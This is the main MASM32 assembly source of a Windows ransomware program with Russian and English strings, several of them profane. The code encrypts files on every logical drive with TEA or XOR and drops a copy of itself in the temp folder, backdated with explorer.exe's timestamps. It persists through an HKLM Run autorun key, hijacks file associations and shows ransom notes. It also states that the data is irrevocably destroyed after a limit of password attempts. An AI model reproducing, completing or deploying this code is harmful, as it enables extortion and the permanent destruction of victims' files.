; Цопирихт by VaZoNeZ.CoM

      .686
      .model flat, stdcall
      option casemap:none
      
      include \masm32\include\windows.inc
      include \masm32\include\kernel32.inc
      include \masm32\include\user32.inc
      include \masm32\include\shell32.inc
      include \masm32\include\advapi32.inc
      include \masm32\include\shlwapi.inc
      include \masm32\include\gdi32.inc
      include \masm32\include\comctl32.inc
      
      includelib \masm32\lib\user32.lib
      includelib \masm32\lib\kernel32.lib
      includelib \masm32\lib\shell32.lib
      includelib \masm32\lib\advapi32.lib
      includelib \masm32\lib\shlwapi.lib
      includelib \masm32\lib\gdi32.lib
      includelib \masm32\lib\comctl32.lib

      HashMem             PROTO :DWORD, :DWORD, :DWORD, :DWORD
      Decrypt             PROTO :DWORD, :DWORD
      TEAInit	            PROTO :DWORD
      TEAEncrypt	        PROTO :DWORD, :DWORD
      TEADecrypt	        PROTO :DWORD, :DWORD
      DropTXT   	        PROTO :DWORD
      RegWrite            PROTO :DWORD, :DWORD, :DWORD, :DWORD
      GetSysDateTime      PROTO
      
      TEA_DELTA           equ  9E3779B9h
      CALG_MD5            equ  08003h
      CFG_RES_ID          equ  0000000Eh
      
      XR_ENABLED          equ  1
      XR_DISABLED         equ  0
      
.data?
      buf                 db   500h  dup (?)
      cpyfrom             db   500h  dup (?)
      TempBuf             db   200h  dup (?)
      TempBuf2            db   200h  dup (?)
      DesktopPath         db   200h  dup (?)
      cmd                 db   500h  dup (?)
      CopyTo              db   200h  dup (?)
      CrptFN              db   500h  dup (?)
      DeFN                db   500h  dup (?)
      WORKING_STATUS      db   ?     ; По ней мы смотрим, что делать - шифровать (0), расшифровывать (1) либо убивать файлы рандомным ключем (2)
      hFile               dd   ?
      fSize               dd   ?
      hMem                dd   ?
      nr                  dd   ?
      bw                  dd   ?
      md5buf              db   10h   dup (?)
      md5buf_2            db   10h   dup (?)
      TEA_KEY             dd   4     dup( ?)
      TEA_KEY_origin      dd   4     dup (?)
      TEA_ROUNDS          dd   ?
      START_OFFSET        dd   ?
      BUF_SIZE            dd   ?
      hKey                dd   ?
      hHeap               dd   ?
      buf2                db   100h  dup (?)
      cmdpath             db   200h  dup (?)
      cmdprm              db   500h  dup (?)
      KEY                 db   10h   dup (?)
      PwdHash             db   10h   dup (?)
      RandomDropExeName   db   10h   dup (?)
      RandomRegAssocName  db   10h   dup (?)
      imgname             db   20h   dup (?)
      BitmapExtractPath   db   200h  dup (?)
      DropTxtBuf          db   500h  dup (?)
      hMasks              dd   ?
      hMessage            dd   ?
      hExt                dd   ?
      TryNmb              dd   ?
      ; Some boolean values [ 5 x 1 byte]
      UseAutorun          db   ?
      DropTxtToAllFldrs   db   ?
      HideOrShowMessage   db   ?
      UsingXorOrTea       db   ?
      UsingEngOrRuInFace  db   ?
      ; File date/time vars
      dt_ct               FILETIME <>
      dt_lat              FILETIME <>
      dt_lwt              FILETIME <>
      sys_ct              FILETIME <>
      sys_lat             FILETIME <>
      sys_lwt             FILETIME <>
      sys_exp_path        db   200h dup (?)

.data
      szClassName         db  '0p3nSOurc3 X0r157, motherfucker!',0
      img_rsrc_name       db  'pussylicker',0
      extension_bmp       db  '.bmp',0
      fake1               db  '.',0
      fake2               db  '..',0
      open                db  'open',0
      exe_ext             db  '.exe',0
      zv                  db  '*',0
      ReadMe              db  'КАК РАСШИФРОВАТЬ ФАЙЛЫ.txt',0
      ReadMe2             db  'HOW TO DECRYPT FILES.txt',0
      szSuccess           db  'Файлы успешно расшифрованы!',0
      szSuccess2          db  'Files have been decrypted successfully!',0
      c_incor             db  'Ошибка!',0
      c_incor2            db  'Error!',0
      t_incor             db  'Пароль введен неверно!',0
      t_incor2            db  'Password is incorrect!',0
      t_info              db  'Внимание! Ваши файлы зашифрованы!',13,10,'Для расшифровки требуется ввести правильный пароль!',0  
      t_info2             db  'Attention! All your files were encrypted!',13,10,'To decrypt files, please enter correct password!',0 
      szDeadFiles         db  'Вы исчерпали лимит попыток - Ваши данные безвозвратно испорчены.',0
      szDeadFiles2        db  'You have reached a limit of attempts - your data is irrevocably broken.',0 ; Я ибу, не англичанин. Скорее всего перевел хуёво
      szPrepDecryptFiles  db  'Пароль введён верно. Нажите OK для начала расшифровки файлов. После нажатия не закрывайте программу до появления сообщения об удачном завершении расшифровки файлов.',0
      szPrepDecryptFiles2 db  'Entered password is correct. Press OK to start decrypting of files. Dont close window and wait until message "Files have been decrypted successfully!" appears.',0
      szREG_SZ            db  'REG_SZ',0
      szIco               db  '\DefaultIcon',0
      szShell             db  '\shell\open\command',0
      szSl                db  '\',0
      szKoma              db  ',0',0
      szAutorunPath       db  'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',0
      szAutorunName       db  'Alcmeter',0
      szExplorerName      db  'explorer.exe',0
      DisplayRegShit      db  'CRYPTED!',0
      szDisplayName       db  'Внимание!',0
      szDisplayName2      db  'Attention!',0
      s_title             db  'Info',0 
      FontNameS           db  'Tahoma',0 
      lbl1                db  'Пароль:',0
      lbl2                db  'Password:',0
      ButnTxt             db  'ОК',0
      ButnTxt3            db  '???',0
      ButnTxt2            db  'Выход',0
      ButnTxt23           db  'Exit',0
      slEdit              db  'EDIT',0
      statClass           db  'STATIC',0
      btnClass            db  'BUTTON',0
      NullStr             db  0

.code  

      include Notification.asm
      include Decrypt.asm
      include Recursive.asm
      include TEA.asm
      include Window.asm
      include Hash.asm
      include ReadOptions.asm
      include SelfDelete.asm

RemoveRegRoutine proc
      invoke  RegDeleteKey, HKEY_CLASSES_ROOT, hExt
      ret
RemoveRegRoutine endp

start:
      invoke  GetProcessHeap
      mov     hHeap, eax
      
      invoke  ReadConfiguration

      invoke  GetTempPath, sizeof TempBuf, addr TempBuf
      invoke  lstrcpy, addr CopyTo, addr TempBuf
      
      invoke  GetModuleFileName, 0, addr cmd, sizeof cmd
      
      invoke  HeapAlloc, hHeap, HEAP_ZERO_MEMORY, BUF_SIZE
      mov     hMem, eax
      
      invoke  TEAInit, addr KEY
      
      invoke  GetSysDateTime
      
      invoke  lstrcat, addr CopyTo, addr RandomDropExeName
      invoke  lstrcat, addr CopyTo, addr exe_ext
      invoke  CopyFile, addr cmd, addr CopyTo, TRUE
      .if     eax == 0
              ; File is already copied, show the window
              jmp     WindowsStart            
      .endif
      
      ; Set date/time to dropped build
      invoke  CreateFile, addr CopyTo, GENERIC_WRITE, 
                          FILE_SHARE_WRITE, 
                          0, OPEN_EXISTING, 0, 0
      mov     hFile, eax
      invoke  SetFileTime, hFile, addr sys_ct, addr sys_lat, addr sys_lwt
      invoke  CloseHandle, hFile
      
      ; Set autorun
      .if     UseAutorun == XR_ENABLED
              invoke  RegWrite, HKEY_LOCAL_MACHINE, addr szAutorunPath, addr szAutorunName, addr CopyTo
      .endif
      
      ; Write registry associations
      call    RegRoutine
      
      mov     byte ptr [WORKING_STATUS], 0
      invoke  SetErrorMode, SEM_FAILCRITICALERRORS
      invoke  GetLogicalDrives
      mov     ecx, 25
find_drives:
      mov     ebx, 1                                     
      shl     ebx, cl                                 
      and     ebx, eax                                    
      je      no_disk                                       
      add     cl,65                                      
      mov     byte ptr buf, cl                             
      sub     cl,65                                     
      mov     dword ptr buf+1, '.*\:'                      
      mov     byte ptr buf+5, '*'                           
      mov     byte ptr buf+6, 0                            
      push    eax                                          
      push    ecx                                            
      call    CryptFiles                                     
      pop     ecx                                           
      pop     eax                                           
no_disk:                                                    
      dec     ecx                                           
      jge     find_drives   
      
      ; Show message, create txt file on the desktop and change wallpaper
      call    NotificateUser
      
ERRORZ:
      invoke  GlobalFree, hMem
FileExists:
      invoke  ExitProcess, 0

RegRoutine proc
      invoke  lstrcpy, addr buf2, addr fake1
      invoke  lstrcat, addr buf2, hExt
      
      invoke  RegWrite, HKEY_CLASSES_ROOT, addr buf2, addr NullStr, addr RandomRegAssocName
      
      invoke  RegWrite, HKEY_CLASSES_ROOT, addr RandomRegAssocName, addr NullStr, addr DisplayRegShit
      
      invoke  lstrcpy, addr buf2, addr RandomRegAssocName
      invoke  lstrcat, addr buf2, addr szIco
      
      invoke  lstrcat, addr CopyTo, addr szKoma
      
      invoke  RegWrite, HKEY_CLASSES_ROOT, addr buf2, addr NullStr, addr CopyTo
      
      invoke  lstrcpy, addr buf2, addr RandomRegAssocName
      invoke  lstrcat, addr buf2, addr szShell
      
      invoke  lstrlen, addr CopyTo
      mov     byte ptr [offset CopyTo - 2 + eax], 0
      
      invoke  RegWrite, HKEY_CLASSES_ROOT, addr buf2, addr NullStr, addr CopyTo
      
      ret
RegRoutine endp

RegWrite proc w_hk:DWORD, w_path:DWORD, w_valname:DWORD, w_val:DWORD
      LOCAL   lpdwDisp :DWORD
      LOCAL   hwKey:DWORD
      
      invoke  RegCreateKeyEx, w_hk, w_path, 0, addr szREG_SZ, 0, KEY_WRITE or KEY_READ, 0, addr hwKey, addr lpdwDisp   
      invoke  lstrlen, w_val  
      invoke  RegSetValueEx, hwKey, w_valname, 0, REG_SZ, w_val, eax
      invoke  RegCloseKey, hwKey
      
      ret
RegWrite endp

GetSysDateTime proc
      LOCAL   hExplFile:DWORD
      invoke  GetWindowsDirectory, addr sys_exp_path, sizeof sys_exp_path
      invoke  PathAddBackslash, addr sys_exp_path
      invoke  lstrcat, addr sys_exp_path, addr szExplorerName
      invoke  CreateFile, addr sys_exp_path, GENERIC_READ, 
                          FILE_SHARE_READ, 
                          0, OPEN_EXISTING, 0, 0
      mov     hExplFile, eax
      invoke  GetFileTime, hExplFile, addr sys_ct, addr sys_lat, addr sys_lwt
      invoke  CloseHandle, hExplFile
      ret
GetSysDateTime endp




end start